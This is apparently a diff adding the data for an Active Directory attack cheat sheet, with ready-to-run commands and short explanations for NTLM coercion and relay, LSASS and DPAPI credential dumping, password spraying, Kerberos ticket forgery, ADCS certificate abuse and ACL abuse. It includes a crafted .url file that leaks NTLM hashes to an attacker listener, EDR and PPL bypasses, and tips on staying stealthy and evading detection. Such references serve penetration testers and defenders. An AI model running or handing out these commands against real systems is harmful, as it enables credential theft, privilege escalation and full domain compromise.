+          {label: 'Malicious .url file', code: `<span class="comment"># Drop this into a writable share</span>\n[InternetShortcut]\nURL=anything\nIconResource=\\\\<span class="var">10.10.10.5</span>\\share\\icon.ico`, explain: `A crafted Windows shortcut file dropped on a share; \`IconResource=\\\\attacker\\share\\icon.ico\` = Explorer fetches the icon over SMB the moment the folder is *browsed* (no click needed), leaking the victim's NTLM hash to your listener.`}
+        ]
+      },
+      {
+        name: 'WebDAV Coercion (WebClient service)',
+        badges: [{type:'windows', label:'Windows'}, {type:'network', label:'Coerce'}],
+        desc: 'If the target has the WebClient service running (often silently enabled by anything that touches a WebDAV path), coercion tools can target it over HTTP on port 80 instead of SMB on 445 — which sidesteps SMB signing entirely, since the auth never goes over SMB in the first place. A <code>.searchConnector-ms</code> file dropped on a share is enough to trigger the WebClient service to start on a host that hasn\'t used it yet.',
+        examples: [
+          {label: 'Force-start the WebClient service on a target', code: `<span class="comment"># Drop this filename on a writable share the target browses</span>\ntest.searchConnector-ms`, explain: `Simply the presence of a file with this extension on a share is enough — Windows Explorer auto-starts the \`WebClient\` (WebDAV) service just to *display* the file, even without opening it, exposing an HTTP-based coercion path.`},
+          {label: 'Coerce over WebDAV instead of SMB', code: `<span class="cmd-str">PetitPotam.py</span> -u jsmith -p P@ss <span class="str">'attacker@80/random.txt'</span> <span class="var">dc01.corp.local</span>`, explain: `\`'attacker@80/random.txt'\` = tells the DC to authenticate over HTTP port 80 (WebDAV) instead of SMB port 445, which slips past SMB signing protections entirely since the auth never touches SMB.`},
+          {label: 'ntlm_theft — generate the full set of coercion files at once', code: `<span class="cmd-str">ntlm_theft.py</span> -g all -s <span class="var">10.10.10.5</span> -f test`, explain: `\`-g all\` = generate every supported coercion file type in one go (\`.url\`, \`.scf\`, \`.searchConnector-ms\`, etc.); \`-s\` = listener IP to embed in the files; \`-f test\` = base filename for the generated set.`}
+        ],
+        notes: {type: 'tip', text: 'Worth checking for specifically — orgs that diligently enforce SMB signing everywhere often haven\'t thought about the WebDAV/port-80 path at all, since it just doesn\'t show up in an SMB-focused hardening checklist.'}
+      }
+    ]
+  },
+  {
+    id: 'relay',
+    title: 'NTLM Relay Attacks',
+    icon: 'fa-arrows-turn-to-dots',
+    intro: 'The NTLM relay matrix. Intercepting an authentication attempt and forwarding (relaying) it to another service to authenticate as the victim.',
+    items: [
+      {
+        name: 'ntlmrelayx.py (SMB/LDAP/HTTP)',
+        badges: [{type:'linux', label:'Python'}, {type:'network', label:'Relay'}],
+        desc: 'The Impacket Swiss-army knife for relaying NTLM authentication. Can relay to SMB, LDAP, HTTP, MSSQL, and more.',
+        examples: [
+          {label: 'SMB to LDAP relay (dump domain)', code: `<span class="cmd-str">ntlmrelayx.py</span> -t <span class="str">ldap://dc01.corp.local</span> -smb2support --escalate-user jsmith`, explain: `\`-t ldap://...\` = relay the captured NTLM auth to LDAP on the DC; \`-smb2support\` = support SMB2/3 clients when catching the coercion; \`--escalate-user\` = if the relayed account has rights, add this user to a privileged group / grant DCSync.`},
+          {label: 'HTTP to LDAP relay (ADCS ESC8)', code: `<span class="cmd-str">ntlmrelayx.py</span> -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, explain: `\`-t http://.../certsrv/certfnsh.asp\` = relay to the AD CS web enrollment endpoint; \`--adcs\` = tell ntlmrelayx to request a certificate instead of doing an LDAP write; \`--template DomainController\` = certificate template to request (ESC8 attack).`}
+        ]
+      },
+      {
+        name: 'Relay to WSUS / MSSQL',
+        badges: [{type:'network', label:'Relay'}],
+        desc: 'Relaying to WSUS (port 8530) allows task deployment via the API. Relaying to MSSQL allows command execution via <code>xp_cmdshell</code>.',
+        examples: [
+          {label: 'Relay to WSUS for code execution', code: `<span class="cmd-str">ntlmrelayx.py</span> -t <span class="str">http://wsus.corp.local:8530/ClientWebService</span> -smb2support`, explain: `\`-t http://wsus:8530/...\` = relay NTLM auth to the WSUS API instead of LDAP; because WSUS traffic is unauthenticated/unsigned by default, this lets you push a malicious 'update' for code execution on the victim.`}
+        ]
+      },
+      {
+        name: 'DC-to-DC Relay (SMB → NETLOGON)',
+        badges: [{type:'dc', label:'DC'}, {type:'network', label:'Relay'}],
+        desc: 'Coerce one Domain Controller into authenticating, and relay that machine-account authentication to the NETLOGON service on a second DC to run DCSync as the first DC\'s own computer account. This is effectively the "safe" cousin of Zerologon — it gets the same DCSync result without ever nulling a computer account password, so it doesn\'t break anything and doesn\'t need CVE-2020-1472 to be unpatched.',
+        examples: [
+          {label: 'Coerce DC-A, relay its auth to DC-B for DCSync', code: `<span class="cmd-str">ntlmrelayx.py</span> -t <span class="var">dcsync://dc-b.corp.local</span> -smb2support -auth-smb <span class="var">'dc-a$':<dc_a_password_or_hash></span>`, explain: `\`-t dcsync://dc-b...\` = tell ntlmrelayx to perform a DCSync against DC-B once it catches an authentication; \`-auth-smb 'dc-a$':<hash>\` = authenticate the *listener* as DC-A's machine account so DC-A's coerced auth can be relayed onward.`}
+        ],
+        notes: {type: 'tip', text: 'Useful when Zerologon itself is patched but you can still coerce one DC to authenticate to another — same end result (krbtgt hash), zero disruption risk.'}
+      },
+      {
+        name: 'Shadow Credentials & RBCD via Relay',
+        badges: [{type:'network', label:'Relay'}],
+        desc: 'If relaying to LDAP as a user with <code>GenericWrite</code> on a target, you can inject a <code>msDS-KeyCredentialLink</code> (Shadow Creds) or set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (RBCD).',
+        examples: [
+          {label: 'RBCD via Relay', code: `<span class="cmd-str">ntlmrelayx.py</span> -t <span class="str">ldap://dc01.corp.local</span> --delegate-access --escalate-user <span class="str">EVIL$</span>`, explain: `\`--delegate-access\` = configure Resource-Based Constrained Delegation on the relay target instead of just dumping data; \`--escalate-user EVIL$\` = the attacker-controlled computer account that will be granted the right to impersonate any user to the target.`}
+        ]
+      },
+      {
+        name: 'CVE-2019-1040 / MS08-068 (MIC Bypass)',
+        badges: [{type:'windows', label:'CVE'}, {type:'network', label:'Relay'}],
+        desc: 'CVE-2019-1040 allows removal of the MIC (Message Integrity Code) in NTLM relay, bypassing SMB signing protections on certain protocols. MS08-068 was a legacy self-relay vulnerability.',
+        examples: [
+          {label: 'Remove the MIC during relay', code: `<span class="cmd-str">ntlmrelayx.py</span> -t <span class="str">ldap://dc01.corp.local</span> --remove-mic`, explain: `\`--remove-mic\` = strip the Message Integrity Code from the relayed NTLMSSP message, bypassing a mitigation that otherwise detects/blocks tampered relay traffic (useful against certain CVE-2019-1040 style checks).`}
+        ]
+      },
+      {
+        name: 'Kerberos Relay',
+        badges: [{type:'cross', label:'Kerberos'}, {type:'network', label:'Relay'}],
+        desc: 'The Kerberos equivalent of NTLM relay: coerce or capture a machine\'s AP-REQ (its Kerberos authentication attempt, e.g. via a coerced RPC/HTTP call) and relay it to a different service on the same host. Because Kerberos service tickets are tied to a specific SPN, this only works cross-protocol on the <em>same machine</em> (no SMB signing to bypass, and it evades classic NTLM-relay detections entirely).',
+        examples: [
+          {label: 'KrbRelay — relay a local coercion to LDAP', code: `<span class="cmd-str">KrbRelay.exe</span> -spn <span class="var">ldap/dc01.corp.local</span> -clsid <span class="var">{coercion-clsid}</span> -rbcd <span class="var">EVIL$</span>`, explain: `\`-spn\` = the service the relayed ticket should be valid for; \`-clsid\` = a local COM coercion trigger (DCOM) instead of a network-based one; \`-rbcd EVIL$\` = configure Resource-Based Constrained Delegation for this computer account via the relay.`},
+          {label: 'KrbRelayUp — local privesc on a domain-joined host', code: `<span class="cmd-str">KrbRelayUp.exe</span> relay -m rbcd`, explain: `\`relay -m rbcd\` = fully automated local-privilege-escalation chain: triggers a local COM coercion, relays it to LDAP, sets up RBCD for a fake computer account, then uses it to get a SYSTEM-equivalent ticket.`}
+        ],
+        notes: {type: 'tip', text: 'Because it never touches SMB signing or the MIC, Kerberos relay sidesteps most of the mitigations orgs put in place for NTLM relay (SMB/LDAP signing, EPA). It is the reason "we enforced signing everywhere" is not the full story anymore.'}
+      }
+    ]
+  },
+  {
+    id: 'creds',
+    title: 'Credential Access & Deep Extraction',
+    icon: 'fa-key',
+    intro: 'Obtaining hashes, tickets, and plaintext credentials from memory, files, network captures, and authentication protocols.',
+    items: [
+      {
+        name: 'LSASS Dumping (mimikatz / lsassy / nanodump)',
+        badges: [{type:'windows', label:'Windows'}, {type:'creds', label:'Creds'}],
+        desc: 'Dumping LSASS memory yields plaintext passwords, NTLM hashes, and Kerberos tickets. <strong>lsassy</strong> does this remotely via Impacket. <strong>nanodump</strong> uses direct syscalls to bypass EDR hooks.',
+        examples: [
+          {label: 'Mimikatz dump', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">privilege::debug</span>\nmimikatz # <span class="cmd-str">sekurlsa::logonpasswords</span>`, explain: `\`privilege::debug\` = elevate Mimikatz's own process token so it can touch LSASS memory; \`sekurlsa::logonpasswords\` = dump all currently cached credentials (plaintext passwords, hashes, Kerberos tickets) from LSASS.`},
+          {label: 'Remote LSASS dump with lsassy', code: `<span class="cmd-str">lsassy</span> -d corp.local -u jsmith -p P@ss <span class="var">10.10.10.0/24</span>`, explain: `\`-d/-u/-p\` = domain credentials with local admin rights; last argument = target(s) to hit; lsassy remotely dumps and parses LSASS on each host in the range without needing to manually transfer a dump file.`}
+        ]
+      },
+      {
+        name: 'LSASS PPL Bypass',
+        badges: [{type:'windows', label:'Windows'}, {type:'creds', label:'Creds'}],
+        desc: 'Windows 11/Server 2022+ enforces LSA Protection (PPL) preventing standard LSASS dumps. <strong>PPLdump64</strong> exploits vulnerable drivers to bypass this. Mimikatz can also unprotect the process in-memory if it has the right hook.',
+        examples: [
+          {label: 'PPLdump64 bypass', code: `<span class="cmd-str">PPLdump64.exe</span> lsass.exe lsass.dmp`, explain: `Dumps \`lsass.exe\` to \`lsass.dmp\` by first stripping its PPL (Protected Process Light) protection, which normally blocks tools like Mimikatz/Task Manager from reading its memory.`},
+          {label: 'Mimikatz unprotect (if permitted)', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">!processprotect</span> /process:lsass.exe /remove`, explain: `\`!processprotect /process:lsass.exe /remove\` = directly removes LSASS's PPL protection flag (requires a signed, trusted driver already loaded), allowing a normal memory dump afterward.`}
+        ]
+      },
+      {
+        name: 'SAM / LSA Secrets / NTDS',
+        badges: [{type:'linux', label:'Python'}, {type:'creds', label:'Creds'}],
+        desc: 'Extracting registry hives. SAM contains local NTLM hashes. LSA Secrets contain service account passwords. NTDS is the whole domain database.',
+        examples: [
+          {label: 'Save hives remotely', code: `<span class="cmd-str">reg.py</span> corp.local/jsmith:P@ss@<span class="var">10.10.10.10</span> backup`, explain: `\`reg.py user:pass@ip backup\` = remotely triggers a registry save of the SAM/SECURITY/SYSTEM hives to disk via the Remote Registry service, without needing to touch LSASS directly.`},
+          {label: 'Parse offline', code: `<span class="cmd-str">secretsdump.py</span> -sam SAM -security SECURITY -system SYSTEM LOCAL`, explain: `\`-sam/-security/-system\` = the three hive files saved by the previous step; \`LOCAL\` = tells secretsdump to parse them offline rather than connecting to a live target, extracting local account hashes and cached secrets.`},
+          {label: 'Metasploit hashdump', code: `<span class="cmd-str">meterpreter></span> hashdump`, explain: `Meterpreter's built-in post-exploitation command that pulls local SAM hashes from a compromised session in one call, no extra tooling needed.`}
+        ]
+      },
+      {
+        name: 'DPAPI (SharpDPAPI / dploot / donpapi)',
+        badges: [{type:'cross', label:'DPAPI'}, {type:'creds', label:'Creds'}],
+        desc: 'Extract and decrypt Data Protection API (DPAPI) blobs. Recovers Chrome/Edge saved passwords, RDP credentials, and WiFi keys. Requires user password or domain backup key.',
+        examples: [
+          {label: 'Dump master keys (dploot)', code: `<span class="cmd-str">dploot</span> masterkey -d corp.local -u jsmith -p P@ss <span class="var">10.10.10.10</span>`, explain: `\`-d/-u/-p\` = domain credentials; target IP = host to pull from; DPAPI 'master keys' are what protects saved browser passwords, Wi-Fi keys, and other DPAPI-encrypted secrets on that machine.`},
+          {label: 'Domain-wide DPAPI dump', code: `<span class="cmd-str">DonPAPI.py</span> corp.local/jsmith:P@ss@<span class="var">10.10.10.0/24</span>`, explain: `Same idea as dploot but automated across an entire subnet at once, pulling and decrypting DPAPI secrets (saved credentials, cookies, Wi-Fi keys) domain-wide.`}
+        ]
+      },
+      {
+        name: 'Azure AD Connect (MSOL) DCSync',
+        badges: [{type:'windows', label:'Windows'}, {type:'creds', label:'Creds'}],
+        desc: 'Azure AD Connect synchronizes on-prem AD with Azure. The MSOL account holds DCSync privileges. Extracting its cleartext password allows instant DCSync.',
+        examples: [
+          {label: 'Decrypt MSOL password', code: `<span class="comment"># On the AAD Connect server</span>\n<span class="cmd-str">Import-Module</span> .\\\\azuread_decrypt_msol_v2.ps1\n<span class="cmd-str">azuread_decrypt_msol_v2</span>`, explain: `Run on the Azure AD Connect server itself; \`Import-Module\` loads the decryption script; \`azuread_decrypt_msol_v2\` then reads the sync engine's config DB and decrypts the on-prem \`MSOL_\` service account password — often a Domain Admin-equivalent account.`}
+        ]
+      },
+      {
+        name: 'KeePass Extraction (KeePwn)',
+        badges: [{type:'cross', label:'KeePass'}, {type:'creds', label:'Creds'}],
+        desc: 'Extracts KeePass master passwords from memory (LSASS) or finds KeePass databases on SMB shares.',
+        examples: [
+          {label: 'Dump KeePass password from memory', code: `<span class="cmd-str">KeePwn.exe</span> --dump`, explain: `Dumps credentials cached in a running KeePass process's memory — useful when a user has an unlocked password database open in their session.`}
+        ]
+      },
+      {
+        name: 'No-Creds Attacks (Timeroast / PXE Thief)',
+        badges: [{type:'linux', label:'Python'}, {type:'creds', label:'Creds'}],
+        desc: 'Unauthenticated credential extraction. <strong>Timeroast</strong> roasts MS-NTP passwords. <strong>PXE Thief</strong> extracts credentials from PXE boot images configured by MECM/SCCM.',
+        examples: [
+          {label: 'Timeroast (capture NTP auth)', code: `<span class="cmd-str">timeroast.py</span> <span class="var">10.10.10.10</span>`, explain: `Sends spoofed NTP authentication requests to the target; Domain Controllers respond with an MD5-keyed MAC that can be cracked offline to recover the machine account's password hash, with **zero prior credentials** needed.`},
+          {label: 'PXE Thief (extract SCCM PXE creds)', code: `<span class="cmd-str">pxethief.py</span> 1`, explain: `\`1\` = mode flag telling the tool to extract SCCM PXE boot media and pull the embedded, encrypted network access account (NAA) credential blob used during OS deployment.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'passwords',
+    title: 'Password Attacks & Policies',
+    icon: 'fa-unlock-keyhole',
+    intro: 'Enumerating password policies and targeting accounts with password spraying and brute force, while avoiding lockouts.',
+    items: [
+      {
+        name: 'net accounts / Get-DomainPolicy',
+        badges: [{type:'windows', label:'Windows'}],
+        desc: 'Enumerate the domain password policy. Identifies minimum length, complexity, and lockout thresholds.',
+        examples: [
+          {label: 'Get domain policy', code: `<span class="cmd-str">net</span> accounts /domain`, explain: `Displays the domain's account/password policy (lockout threshold, min password length, lockout duration) — always check this *before* spraying to avoid locking out accounts.`}
+        ]
+      },
+      {
+        name: 'kerbrute',
+        badges: [{type:'linux', label:'Go'}],
+        desc: 'Fast enumeration of valid usernames and safe password spraying against Kerberos (KRB5). Does not generate event 4625.',
+        examples: [
+          {label: 'Password spray', code: `<span class="cmd-str">kerbrute</span> passwordspray -d corp.local --dc <span class="var">10.10.10.10</span> users.txt <span class="str">'Fall2025!'</span>`, explain: `\`passwordspray\` = mode; \`-d\` = domain; \`--dc\` = DC to authenticate against; last two args = username list and the single password to try — kerbrute is fast and stealthy since failed Kerberos pre-auth doesn't always log like SMB does.`}
+        ]
+      },
+      {
+        name: 'smartbrute',
+        badges: [{type:'linux', label:'Python'}],
+        desc: 'Smart password spraying tool that queries the lockout policy and stops before triggering lockouts.',
+        examples: [
+          {label: 'Smart spray via SMB', code: `<span class="cmd-str">smartbrute.py</span> smb -d corp.local -u users.txt -p <span class="str">'Fall2025!'</span> --dc <span class="var">10.10.10.10</span>`, explain: `\`smb\` = protocol to spray over; \`-u/-p\` = user list and password list/single password; \`--dc\` = target DC; smartbrute adds jitter/lockout-awareness on top of a standard spray to reduce detection and lockout risk.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'kerberos',
+    title: 'Kerberos Abuse & Ticket Mechanics',
+    icon: 'fa-ticket',
+    intro: 'Attacks exploiting the Kerberos authentication protocol — AS-REP Roasting, Kerberoasting, ticket forgery, conversion, and PKINIT.',
+    items: [
+      {
+        name: 'AS-REP Roasting / Kerberoasting',
+        badges: [{type:'cross', label:'Kerberos'}, {type:'creds', label:'Creds'}],
+        desc: 'AS-REP targets pre-auth disabled accounts. Kerberoasting targets service accounts (SPNs) to extract TGS tickets for offline cracking.',
+        examples: [
+          {label: 'Kerberoast (Rubeus)', code: `<span class="cmd-str">Rubeus.exe</span> kerberoast /outfile:tgs.txt`, explain: `\`kerberoast /outfile:tgs.txt\` = requests a TGS (service ticket) for every account with an SPN set, then writes the crackable ticket hashes to a file for offline cracking with hashcat/John.`}
+        ]
+      },
+      {
+        name: 'Golden / Silver / Diamond / Sapphire Tickets',
+        badges: [{type:'dc', label:'DC Compromised'}, {type:'cross', label:'Forge'}],
+        desc: 'Forged Kerberos tickets, from loudest to stealthiest. <strong>Golden</strong> forges a TGT with the krbtgt hash — full domain, but a fully-fake ticket stands out. <strong>Silver</strong> forges a TGS directly with a service/machine account hash, skipping the DC entirely — no KDC round-trip means no easy DC-side detection, but access is limited to that one service. <strong>Diamond</strong> takes a real TGT and rewrites its PAC in-flight. <strong>Sapphire</strong> is the newest variant, using the target service\'s own key material so the forged ticket is nearly indistinguishable from a legitimate one.',
+        examples: [
+          {label: 'Silver ticket via Impacket (forge a CIFS TGS)', code: `<span class="cmd-str">ticketer.py</span> -nthash <span class="var">&lt;machine_nt_hash&gt;</span> -domain-sid <span class="var">&lt;domain_sid&gt;</span> -domain <span class="var">corp.local</span> -spn <span class="var">cifs/file01.corp.local</span> Administrator`, explain: `\`-nthash\` = the target machine account's NT hash (needed to forge a valid service ticket); \`-domain-sid\` = domain's SID; \`-spn\` = service the forged ticket should grant access to; last arg = the user identity to impersonate — creates a ticket for one specific service only (unlike a Golden Ticket).`},
+          {label: 'Silver ticket via Mimikatz', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">kerberos::golden</span> /sid:S-1-5-21-... /domain:corp.local /target:file01.corp.local /service:cifs /rc4:<span class="var">&lt;machine_nt_hash&gt;</span> /user:Administrator /ptt`, explain: `\`/sid\` = domain SID; \`/domain\` = domain name; \`/target\` = the service's host; \`/service\` = the SPN's service class (e.g. \`cifs\`); \`/rc4\` = the service account/machine's NT hash; \`/user\` = identity to impersonate; \`/ptt\` = inject the forged ticket directly into the current session.`},
+          {label: 'Diamond ticket via Rubeus', code: `<span class="cmd-str">Rubeus.exe</span> diamond /krbkey:KRBTGT_HASH /user:jsmith /password:P@ss /ticketuser:Administrator /domain:corp.local /dc:dc01.corp.local /ptt`, explain: `\`/krbkey\` = the krbtgt key (like a Golden Ticket); \`/user\`/\`/password\` = a real, valid low-privilege account used as a base; \`/ticketuser\` = who the final ticket claims to be; combines a real logon with a forged identity to evade some Golden Ticket detections; \`/ptt\` = inject into memory.`}
+        ],
+        notes: {type: 'tip', text: 'Silver tickets never touch the DC, so they don\'t generate a 4768/4769 on it — that\'s exactly why they\'re a good stealth option when you only need one specific service (e.g. CIFS for file access) rather than domain-wide reach.'}
+      },
+      {
+        name: 'Pass-the-Ticket (PtT) & Conversion',
+        badges: [{type:'cross', label:'Kerberos'}],
+        desc: 'Injecting a stolen Kerberos ticket (.kirbi or .ccache) into the current session. <strong>ticketConverter.py</strong> converts between Windows/Linux formats.',
+        examples: [
+          {label: 'Mimikatz inject .kirbi', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">kerberos::ptc</span> ticket.kirbi`, explain: `\`kerberos::ptc\` (pass-the-cache) = injects a previously obtained \`.kirbi\` ticket file directly into the current logon session's memory, letting you use it immediately.`},
+          {label: 'Convert Kirbi to CCache', code: `<span class="cmd-str">ticketConverter.py</span> ticket.kirbi ticket.ccache`, explain: `Converts a Windows-format \`.kirbi\` ticket (used by Mimikatz/Rubeus) into the \`.ccache\` format Linux Kerberos tools expect, so tickets can move between OS toolchains.`},
+          {label: 'Set env var for Linux tools', code: `<span class="cmd-str">export</span> KRB5CCNAME=ticket.ccache`, explain: `Sets the environment variable that Linux Kerberos libraries (and Impacket) read to know which ticket cache file to use for authentication — points tools at your \`.ccache\` file.`}
+        ]
+      },
+      {
+        name: 'SPN Substitution (tgssub)',
+        badges: [{type:'cross', label:'Kerberos'}],
+        desc: 'Modifies the Service Principal Name (SPN) inside a stolen TGS ticket to access a different service on the same host.',
+        examples: [
+          {label: 'Substitute SPN in CCache', code: `<span class="cmd-str">tgssub.py</span> -in ticket.ccache -altservice cifs/file02.corp.local`, explain: `\`-in\` = source ticket; \`-altservice\` = new SPN to stamp onto the ticket without re-requesting it from the KDC, letting you reuse a ticket meant for one service against a different one on the same host.`}
+        ]
+      },
+      {
+        name: 'UnPAC the Hash & PKINIT',
+        badges: [{type:'cross', label:'Kerberos'}, {type:'cross', label:'ADCS'}],
+        desc: 'Uses a certificate to request a TGT via PKINIT, then extracts the NTLM hash from the PAC structure of the TGT. <strong>gettgtpkinit.py</strong> and <strong>getnthash.py</strong> perform this chain.',
+        examples: [
+          {label: 'Request TGT with cert', code: `<span class="cmd-str">gettgtpkinit.py</span> -pfx cert.pfx corp.local/jsmith TGT.ccache`, explain: `\`-pfx\` = a certificate (obtained via ADCS abuse) belonging to the target user; performs PKINIT authentication with that cert to get a real TGT, without ever knowing the user's password.`},
+          {label: 'Extract NTLM hash from TGT', code: `<span class="cmd-str">getnthash.py</span> -key NTLM_AES_KEY corp.local/jsmith TGT.ccache`, explain: `\`-key\` = the AES key extracted alongside the cert/TGT; uses the U2U (user-to-user) Kerberos extension to recover the user's actual NTLM hash from a PKINIT-obtained TGT — useful for pass-the-hash afterward.`}
+        ]
+      },
+      {
+        name: 'Delegation Abuse (Unconstrained / Constrained / RBCD)',
+        badges: [{type:'cross', label:'Delegation'}],
+        desc: 'Exploit delegation settings to impersonate users. RBCD allows impersonation if you have Write privileges on a computer object.',
+        examples: [
+          {label: 'RBCD attack — impersonate Administrator', code: `<span class="cmd-str">getST.py</span> -spn cifs/file01.corp.local -impersonate Administrator corp.local/<span class="str">'EVIL$'</span>:Pass123!`, explain: `\`-spn\` = the service you want a ticket for; \`-impersonate Administrator\` = the user to impersonate via S4U2Self/S4U2Proxy; last arg = the attacker-controlled computer account's credentials that has been configured with Resource-Based Constrained Delegation onto the target.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'adcs',
+    title: 'ADCS Deep Dive',
+    icon: 'fa-certificate',
+    intro: 'Active Directory Certificate Services is the most impactful modern AD attack surface. Misconfigured templates lead to instant domain compromise.',
+    items: [
+      {
+        name: 'certipy find',
+        badges: [{type:'cross', label:'ADCS'}],
+        desc: 'Comprehensive ADCS enumeration. Outputs all CAs, templates, and their configurations in JSON. Identifies vulnerable templates automatically.',
+        examples: [
+          {label: 'Full enumeration with vulnerability scan', code: `<span class="cmd-str">certipy</span> find -u jsmith@corp.local -p P@ss -dc-ip <span class="var">10.10.10.10</span> -stdout -vulnerable`, explain: `\`-u/-p\` = credentials; \`-dc-ip\` = target DC; \`-stdout\` = print results to console instead of a file; \`-vulnerable\` = only show templates/CAs flagged as exploitable (ESC1–ESC16), the fastest way to triage ADCS misconfigurations.`}
+        ]
+      },
+      {
+        name: 'ESC1 - SAN with Enrollee Supplies Subject',
+        badges: [{type:'cross', label:'ESC1'}],
+        desc: 'Template allows the enrollee to specify the Subject Alternative Name (SAN), is enabled for client authentication, and can be enrolled by a regular user.',
+        examples: [
+          {label: 'Request a Domain Admin cert', code: `<span class="cmd-str">certipy</span> req -u jsmith@corp.local -p P@ss -ca <span class="str">'CORP-CA'</span> -template <span class="str">'UserCert'</span> -upn Administrator@corp.local`, explain: `\`-ca\` = the Certificate Authority name; \`-template\` = the vulnerable template (e.g. allows client-supplied SAN); \`-upn\` = the identity to embed in the request, letting you get a certificate that authenticates *as* Administrator (ESC1).`}
+        ]
+      },
+      {
+        name: 'ESC2-ESC7 - Template & CA Abuse',
+        badges: [{type:'cross', label:'ESC2-7'}],
+        desc: 'ESC2: Any Purpose EKU (or no EKU). ESC3: Certificate Request Agent template — lets you enroll on behalf of other users. ESC4: Vulnerable template ACLs (e.g. WriteOwner/WriteDacl). ESC5: Vulnerable PKI object ACLs (CA object, IssuancePolicy). ESC6: <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA. ESC7: ManageCA / ManageCertificates rights on the CA itself.',
+        examples: [
+          {label: 'ESC4 - Modify template to ESC1-equivalent', code: `<span class="cmd-str">certipy</span> template -u jsmith@corp.local -p P@ss -template <span class="str">'BadTemplate'</span> -save-old`, explain: `\`-save-old\` = back up the template's current config before overwriting it; the tool temporarily reconfigures a template you have write access to so it becomes exploitable like ESC1, then can be reverted.`},
+          {label: 'ESC3 - Enroll on behalf of another user', code: `<span class="comment"># Step 1: request an enrollment agent cert</span>\n<span class="cmd-str">certipy</span> req -u jsmith@corp.local -p P@ss -ca <span class="str">'CORP-CA'</span> -template <span class="str">'EnrollmentAgent'</span>\n<span class="comment"># Step 2: use it to request a cert as Administrator</span>\n<span class="cmd-str">certipy</span> req -u jsmith@corp.local -p P@ss -ca <span class="str">'CORP-CA'</span> -template <span class="str">'User'</span> -on-behalf-of <span class="str">'corp\\Administrator'</span> -pfx agent.pfx`, explain: `Two-step ESC3: first request a certificate using the 'Enrollment Agent' template (grants the *right* to enroll on behalf of others); second, use that agent certificate (\`-on-behalf-of\`) to request a normal user cert while claiming to be Administrator.`}
+        ],
+        notes: {type: 'warning', text: '<b>Corrected in this revision:</b> ESC3 is enrollment-agent template abuse, not "enrollee supplies subject" (that\'s ESC1). ESC6\'s flag is <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>, not "ALTISSUER" — an earlier version of this reference had both wrong.'}
+      },
+      {
+        name: 'ESC8 - NTLM Relay to Web Enrollment',
+        badges: [{type:'cross', label:'ESC8'}],
+        desc: 'HTTP-based certificate enrollment endpoints are vulnerable to NTLM relay. Coerce a DA to authenticate to your relay, which forwards to the CA.',
+        examples: [
+          {label: 'Coerce + relay (PetitPotam → ntlmrelayx)', code: `<span class="cmd-str">ntlmrelayx.py</span> -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, explain: `Combines coercion (PetitPotam forcing the CA/DC to authenticate) with relaying that authentication straight into a certificate request against the vulnerable web enrollment endpoint (ESC8) — same relay syntax as example #28.`}
+        ]
+      },
+      {
+        name: 'ESC9-ESC15 & SChannel Abuse',
+        badges: [{type:'cross', label:'Advanced'}],
+        desc: 'Advanced ESCs covering <code>noSecurityExtension</code> abuse, certificate chaining, and weak crypto. <strong>SChannel</strong> abuse (a.k.a. <strong>Pass-the-Certificate</strong>) allows direct LDAP binding using a cert via <code>passthecert.py</code> — no PKINIT/TGT round-trip needed, which is what separates it from the UnPAC-the-Hash/PKINIT flow above.',
+        examples: [
+          {label: 'SChannel cert mapping to LDAP', code: `<span class="cmd-str">certipy</span> auth -pfx admin.pfx -ldap-shell -dc-ip <span class="var">10.10.10.10</span>`, explain: `\`-pfx\` = a certificate belonging to a privileged account; \`-ldap-shell\` = authenticate to LDAP via Schannel using that cert (instead of Kerberos/NTLM) and drop into an interactive LDAP shell for further AD manipulation.`},
+          {label: 'Pass-the-Certificate directly to an LDAP shell', code: `<span class="cmd-str">passthecert.py</span> -action ldap-shell -crt user.crt -key user.key -domain corp.local -dc-ip <span class="var">10.10.10.10</span>`, explain: `\`-crt/-key\` = the certificate and private key pair (PEM format); authenticates to LDAP over Schannel directly from the raw cert files rather than a \`.pfx\` bundle, then opens an LDAP shell.`}
+        ]
+      },
+      {
+        name: 'Golden Certificate',
+        badges: [{type:'dc', label:'CA Compromised'}, {type:'cross', label:'Persist'}],
+        desc: 'Forge a certificate using the CA\'s private key. Allows indefinite persistence — the cert is trusted as long as the CA is trusted.',
+        examples: [
+          {label: 'Forge a cert with the CA private key', code: `<span class="cmd-str">certipy</span> forge -ca-pfx ca.pfx -upn Administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'`, explain: `\`-ca-pfx\` = the **CA's own** private key (a full CA compromise); \`-upn\`/\`-subject\` = arbitrary identity to embed; with the CA key you can mint a valid certificate for *any* user, including ones that don't exist, without ever touching the CA's enrollment service.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'acl',
+    title: 'ACL Abuse & Object Control',
+    icon: 'fa-sitemap',
+    intro: 'Exploitation of misconfigured Access Control Lists (ACLs) across AD objects. What a given right lets you do depends heavily on the object type it\'s granted on — broken out below by OU, User, Computer, and Group, the same way you\'d actually triage a BloodHound edge.',
+    items: [
+      {
+        name: 'On OU — GPO Links & Delegated Rights',
+        badges: [{type:'cross', label:'ACL'}, {type:'network', label:'OU'}],
+        desc: '<code>GenericAll</code>/<code>GenericWrite</code>/<code>WriteDacl</code> on an OU, or specifically the right to write the <code>gPLink</code> attribute, lets you link an attacker-controlled GPO to every object under that OU — a one-shot way to push code to every computer or user it contains.',
+        examples: [
+          {label: 'Find who can write GP-Link on OUs', code: `<span class="cmd-str">Get-DomainOU</span> | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier`, explain: `Enumerates all OUs, resolves their ACLs (\`-ResolveGUIDs\` turns raw GUIDs into readable rights names), then filters for principals with \`WriteProperty\` rights over the \`GP-Link\` attribute — meaning they could link a malicious GPO to that OU.`},
